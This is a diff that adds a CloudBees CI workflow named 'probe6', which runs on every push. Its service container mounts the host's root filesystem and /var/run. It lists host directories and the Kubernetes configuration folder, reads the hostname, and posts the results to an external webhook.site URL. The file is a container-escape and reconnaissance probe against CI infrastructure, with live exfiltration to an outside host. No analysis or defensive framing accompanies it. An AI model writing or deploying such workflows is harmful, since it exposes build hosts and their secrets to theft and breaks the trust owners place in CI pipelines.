@@ -1,0 +1,25 @@
+apiVersion: automation.cloudbees.io/v1alpha1
+kind: workflow
+name: probe6
+
+on:
+  push:
+    branches:
+      - "**"
+
+jobs:
+  svc:
+    services:
+      hostmounter:
+        image: alpine:3.20
+        entrypoint: /bin/sh
+        args: "-c \"O=\$( { echo HOSTROOT; ls -la /hostroot 2>&1 | head -25; echo VARRUN; ls -la /hostvarrun 2>&1 | head -25; echo HOSTNAME; cat /hostroot/etc/hostname 2>&1; echo KUBELET; ls -la /hostroot/etc/kubernetes 2>&1 | head -10; } | head -c 3000 ); wget -q -O- --post-data=\"\$O\" https://webhook.site/fcf51b26-7565-4939-ae43-183e62117a14/hostmount ; sleep 60\""
+        volumes:
+          - source: /
+            destination: /hostroot
+          - source: /var/run
+            destination: /hostvarrun
+    steps:
+      - name: wait
+        uses: docker://alpine:3.20
+        run: sleep 30; echo done
